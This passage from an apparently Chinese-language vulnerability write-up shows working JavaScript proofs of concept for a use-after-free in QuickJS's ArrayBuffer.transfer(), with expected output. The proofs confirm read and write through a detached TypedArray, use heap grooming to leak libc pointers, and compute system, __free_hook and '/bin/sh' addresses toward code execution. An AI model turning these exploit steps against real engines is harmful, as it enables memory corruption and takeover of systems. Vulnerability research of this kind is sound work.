    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ❌ Expected behavior: TypeError (ArrayBuffer is detached)"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Actual behavior: Successfully read value = 0x"</span> + 
                oldValue.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  Analysis:"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"    - ArrayBuffer ab1 is marked as detached"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"    - But TypedArray ta1 still has valid length and data pointer"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"    - Can access memory that should be inaccessible"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 阶段5：检测UAF - 写入</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 5] Testing UAF: Writing through detached TypedArray..."</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Attempting to write ta1[0] = 0xDEADBEEF..."</span>);
    
    ta1[<span class="hljs-number">0</span>] = <span class="hljs-number">0xDEADBEEF</span>;
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Write operation succeeded (should have failed)"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 阶段6：检查内存损坏</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 6] Checking for memory corruption..."</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Reading ta2[0] to see if new buffer was affected..."</span>);
    
    <span class="hljs-keyword">const</span> newValue = ta2[<span class="hljs-number">0</span>];
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta2[0] = 0x"</span> + newValue.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-keyword">if</span> (newValue === <span class="hljs-number">0xDEADBEEF</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;31m  [!! CRITICAL !!] Memory corruption detected!"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  Write through ta1 affected ta2's data!"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  This indicates the buffers share or overlap memory.\x1b[0m"</span>);
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (newValue === <span class="hljs-number">0xAAAA0000</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;33m  [!] Data preserved in new buffer"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  Write through ta1 affected old memory location"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  Old memory might be reused by other objects\x1b[0m"</span>);
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 阶段7：多次读写测试</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Phase 7] Extended UAF test - multiple operations..."</span>);
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
        ta1[i] = <span class="hljs-number">0xBAAD0000</span> + i;
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Wrote pattern 0xBAAD0000-0xBAAD0004 through ta1"</span>);
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Reading back through ta1:"</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ta1["</span> + i + <span class="hljs-string">"] = 0x"</span> + 
                    ta1[i].<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Checking ta2 for corruption:"</span>);
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ta2["</span> + i + <span class="hljs-string">"] = 0x"</span> + 
                    ta2[i].<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">8</span>, <span class="hljs-string">"0"</span>));
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 总结</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Summary] UAF Vulnerability Characteristics:"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  1. TypedArray retains data pointer after ArrayBuffer.transfer()"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  2. Can read from freed/transferred memory"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  3. Can write to freed/transferred memory"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  4. May corrupt new ArrayBuffer if memory is reused"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  5. No bounds checking on detached buffer"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;32m[✓] Vulnerability successfully reproduced!\x1b[0m"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
} <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;32m"</span> + <span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [✓] NO UAF DETECTED (Expected secure behavior)"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>) + <span class="hljs-string">"\x1b[0m"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  Error message:"</span>, e.<span class="hljs-property">message</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  TypedArray correctly detached and access denied"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Verification complete"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
</code></pre>
<p><strong>预期输出（漏洞版本）：</strong></p>
<pre><code class="hljs language-ini" lang="ini">======================================================================
<span class="hljs-section">[*]</span> QuickJS ArrayBuffer.transfer() UAF Vulnerability <span class="hljs-attr">Verification</span>
======================================================================

<span class="hljs-section">[Phase 1]</span> Creating ArrayBuffer and TypedArray...
  <span class="hljs-section">[+]</span> ArrayBuffer created: <span class="hljs-attr">size</span> = <span class="hljs-number">0</span>x100 bytes
  <span class="hljs-section">[+]</span> TypedArray created: <span class="hljs-attr">length</span> = <span class="hljs-number">64</span>
  <span class="hljs-section">[+]</span> TypedArray <span class="hljs-attr">byteLength</span> = <span class="hljs-number">256</span>

<span class="hljs-section">[Phase 2]</span> Filling with test pattern...
  <span class="hljs-section">[+]</span> Pattern: 0xAAAA0000, 0xAAAA0001, 0xAAAA0002, ...
  <span class="hljs-section">[+]</span> ta1<span class="hljs-section">[0]</span> = 0xaaaa0000
  <span class="hljs-section">[+]</span> ta1<span class="hljs-section">[1]</span> = 0xaaaa0001
  <span class="hljs-section">[+]</span> ta1<span class="hljs-section">[2]</span> = 0xaaaa0002

<span class="hljs-section">[Phase 3]</span> Triggering vulnerability via transfer()...
  <span class="hljs-section">[*]</span> Calling ab1.transfer()...
  <span class="hljs-section">[+]</span> Transfer completed
  <span class="hljs-section">[+]</span> ab1 should be detached now
  <span class="hljs-section">[+]</span> <span class="hljs-attr">ab1.byteLength</span> = <span class="hljs-number">0</span> (should be <span class="hljs-number">0</span>)
  <span class="hljs-section">[+]</span> ta2 is the new TypedArray pointing to transferred data

<span class="hljs-section">[Phase 4]</span> Testing UAF: Reading from detached TypedArray...
  <span class="hljs-section">[*]</span> Attempting to read ta1<span class="hljs-section">[0]</span> (should fail but won't)...

======================================================================
  <span class="hljs-section">[!!! UAF VULNERABILITY CONFIRMED !!!]</span>
======================================================================

  ❌ Expected behavior: TypeError (ArrayBuffer is detached)
  ✓ Actual behavior: Successfully read <span class="hljs-attr">value</span> = <span class="hljs-number">0</span>xaaaa0000

  Analysis:
    - ArrayBuffer ab1 is marked as detached
    - But TypedArray ta1 still has valid length and data pointer
    - Can access memory that should be inaccessible

<span class="hljs-section">[Phase 5]</span> Testing UAF: Writing through detached TypedArray...
  <span class="hljs-section">[*]</span> Attempting to write ta1<span class="hljs-section">[0]</span> = 0xDEADBEEF...
  ✓ Write operation succeeded (should have failed)

<span class="hljs-section">[Phase 6]</span> Checking for memory corruption...
  <span class="hljs-section">[*]</span> Reading ta2<span class="hljs-section">[0]</span> to see if new buffer was affected...
  <span class="hljs-section">[+]</span> ta2<span class="hljs-section">[0]</span> = 0xdeadbeef

  <span class="hljs-section">[!! CRITICAL !!]</span> Memory corruption detected!
  Write through ta1 affected ta2's data!
  This indicates the buffers share or overlap memory.

<span class="hljs-section">[Summary]</span> UAF Vulnerability Characteristics:
  1. TypedArray retains data pointer after ArrayBuffer.transfer()
  2. Can read from freed/transferred memory
  3. Can write to freed/transferred memory
  4. May corrupt new ArrayBuffer if memory is reused
  5. No bounds checking on detached buffer

<span class="hljs-section">[✓]</span> Vulnerability successfully reproduced!
</code></pre>
<h4 data-id="heading-21">实验2：任意地址读取验证</h4>
<p>利用UAF，我们可以读取堆上残留的指针，从而泄露libc和堆地址：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// arbitrary_read_verify.js - 验证任意读能力</span>

<span class="hljs-keyword">function</span> <span class="hljs-title function_">tohex</span>(<span class="hljs-params">v</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"0x"</span> + v.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">16</span>, <span class="hljs-string">"0"</span>);
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[*] Arbitrary Read Capability Verification"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤1：堆风水 - 创建大块触发unsorted bin</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 1] Heap grooming - creating large chunks..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Purpose: Populate unsorted bin to get libc pointers"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">const</span> tmp1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> tmp5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created tmp1: 0x800 bytes"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created tmp5: 0x800 bytes"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] These will be used to stabilize heap layout"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤2：创建目标ArrayBuffer</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 2] Creating target ArrayBuffer for leak..."</span>);

<span class="hljs-keyword">const</span> ab1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x800</span>);
<span class="hljs-keyword">const</span> ta1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created ab1: 0x800 bytes"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created ta1: BigUint64Array view"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] ta1.length = "</span> + ta1.<span class="hljs-property">length</span> + <span class="hljs-string">" (64-bit elements)"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤3：创建小块用于堆布局</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 3] Creating small buffers for heap layout..."</span>);

<span class="hljs-keyword">const</span> tmp2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp3 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);
<span class="hljs-keyword">const</span> tmp4 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x10</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created 3 small buffers (0x10 bytes each)"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] These help control heap chunk placement"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤4：触发UAF</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 4] Triggering UAF via transfer()..."</span>);

<span class="hljs-keyword">let</span> ab1_f = ab1.<span class="hljs-title function_">transfer</span>();
<span class="hljs-keyword">let</span> ta1_f = <span class="hljs-keyword">new</span> <span class="hljs-title class_">BigUint64Array</span>(ab1_f);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Called ab1.transfer()"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Created new TypedArray ta1_f on transferred buffer"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤5：释放新buffer，让内存进入bins</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 5] Freeing new buffer to populate bins..."</span>);

ab1_f = <span class="hljs-literal">null</span>;
ta1_f = <span class="hljs-literal">null</span>;

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Set ab1_f = null"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Set ta1_f = null"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Chunk will enter unsorted bin or tcache"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Bin metadata will contain libc pointers"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-comment">// 步骤6：通过UAF读取泄露的指针</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 6] Reading leaked pointers via UAF..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [*] Using ta1 (which still has dangling pointer)..."</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();

<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> leaked_value = ta1[<span class="hljs-number">0</span>];
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;32m  [✓] Successfully read via dangling pointer!\x1b[0m"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Raw leaked value: "</span> + <span class="hljs-title function_">tohex</span>(leaked_value));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 步骤7：分析泄露的数据</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 7] Analyzing leaked data..."</span>);
    
    <span class="hljs-comment">// 检查是否为libc指针（高位应该是0x7f）</span>
    <span class="hljs-keyword">const</span> addr_str = leaked_value.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>);
    <span class="hljs-keyword">const</span> is_userspace = addr_str.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">12</span> &amp;&amp; addr_str.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"7f"</span>);
    
    <span class="hljs-keyword">if</span> (is_userspace) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Leaked value appears to be a libc pointer!"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      - High byte: 0x7f (userspace high address)"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      - Length: "</span> + addr_str.<span class="hljs-property">length</span> + <span class="hljs-string">" hex digits"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
        
        <span class="hljs-comment">// 计算libc基址（偏移需要根据实际libc版本调整）</span>
        <span class="hljs-comment">// 这里假设泄露的是main_arena+96的地址</span>
        <span class="hljs-keyword">const</span> libc_leak = leaked_value;
        <span class="hljs-keyword">const</span> libc_offset = <span class="hljs-number">0x203b20n</span>; <span class="hljs-comment">// 根据实际环境调整</span>
        <span class="hljs-keyword">const</span> libc_base = libc_leak - libc_offset;
        
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 8] Calculating addresses..."</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Leaked pointer: "</span> + <span class="hljs-title function_">tohex</span>(libc_leak));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Assumed offset: "</span> + <span class="hljs-title function_">tohex</span>(libc_offset));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Calculated libc base: "</span> + <span class="hljs-title function_">tohex</span>(libc_base));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
        
        <span class="hljs-comment">// 验证地址合理性</span>
        <span class="hljs-keyword">const</span> base_str = libc_base.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>);
        <span class="hljs-keyword">if</span> (base_str.<span class="hljs-property">length</span> === <span class="hljs-number">12</span> &amp;&amp; base_str.<span class="hljs-title function_">endsWith</span>(<span class="hljs-string">"000"</span>)) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  \x1b[1;32m[✓] Libc base looks valid (aligned to page)\x1b[0m"</span>);
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  \x1b[1;33m[⚠] Libc base may be incorrect\x1b[0m"</span>);
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      Offset 0x203b20 might not match your libc version"</span>);
        }
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
        
        <span class="hljs-comment">// 计算常用函数地址</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 9] Computing useful addresses..."</span>);
        <span class="hljs-keyword">const</span> system_offset = <span class="hljs-number">0x58750n</span>;
        <span class="hljs-keyword">const</span> free_hook_offset = <span class="hljs-number">0x203b20n</span>;
        <span class="hljs-keyword">const</span> str_offset = <span class="hljs-number">0x1b45bd</span>;
        
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] system@libc:      "</span> + <span class="hljs-title function_">tohex</span>(libc_base + system_offset));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] __free_hook:      "</span> + <span class="hljs-title function_">tohex</span>(libc_base + free_hook_offset));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] \"/bin/sh\" string: "</span> + <span class="hljs-title function_">tohex</span>(libc_base + <span class="hljs-title class_">BigInt</span>(str_offset)));
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
        
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (leaked_value &lt; <span class="hljs-number">0x1000000n</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Leaked value appears to be a small integer"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      - Might be heap metadata or size field"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Leaked value appears to be a heap pointer"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      - Could be used to calculate heap base"</span>);
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    }
    
    <span class="hljs-comment">// 步骤10：读取更多数据</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Step 10] Reading additional memory content..."</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  [+] Dumping first 16 qwords via UAF:"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">16</span>; i++) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">const</span> val = ta1[i];
            <span class="hljs-keyword">const</span> hex_val = <span class="hljs-title function_">tohex</span>(val);
            <span class="hljs-keyword">const</span> offset = <span class="hljs-string">"+"</span> + (i * <span class="hljs-number">8</span>).<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">3</span>, <span class="hljs-string">"0"</span>);
            
            <span class="hljs-comment">// 分析每个值的可能含义</span>
            <span class="hljs-keyword">let</span> annotation = <span class="hljs-string">""</span>;
            <span class="hljs-keyword">const</span> val_str = val.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>);
            <span class="hljs-keyword">if</span> (val_str.<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"7f"</span>) &amp;&amp; val_str.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">12</span>) {
                annotation = <span class="hljs-string">" &lt;- possible libc pointer"</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val === <span class="hljs-number">0n</span>) {
                annotation = <span class="hljs-string">" &lt;- NULL"</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val &lt; <span class="hljs-number">0x1000n</span>) {
                annotation = <span class="hljs-string">" &lt;- small value (size/flag?)"</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (val_str.<span class="hljs-property">length</span> &gt;= <span class="hljs-number">12</span>) {
                annotation = <span class="hljs-string">" &lt;- possible heap pointer"</span>;
            }
            
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ["</span> + offset + <span class="hljs-string">"] "</span> + hex_val + annotation);
        } <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"      ["</span> + offset + <span class="hljs-string">"] &lt;read failed&gt;"</span>);
        }
    }
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
    <span class="hljs-comment">// 总结</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"[Summary] Arbitrary Read Capability:"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Can read freed memory via dangling TypedArray pointer"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Successfully leaked heap metadata/pointers"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Can potentially leak libc addresses"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"  ✓ Can dump arbitrary memory regions"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;32m[+] Arbitrary read primitive confirmed!\x1b[0m"</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
    
} <span class="hljs-keyword">catch</span> (e) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"\x1b[1;31m  [✗] Read failed (no UAF):\x1b[0m "</span> + e.<span class="hljs-property">message</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>();
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"="</span>.<span class="hljs-title function_">repeat</span>(<span class="hljs-number">70</span>));
</code></pre>
<p><strong>关键技术点：</strong></p>
<ol>
<li><strong>Unsorted Bin技巧</strong>：创建大块ArrayBuffer（0x800字节）并释放，会进入unsorted bin，其fd/bk指针指向libc中的main_arena</li>
<li><strong>UAF读取</strong>：通过悬空的TypedArray指针读取已释放chunk的内容，获取libc指针</li>
<li><strong>地址计算</strong>：根据已知偏移量计算libc基址和各种有用函数的地址</li>
</ol>
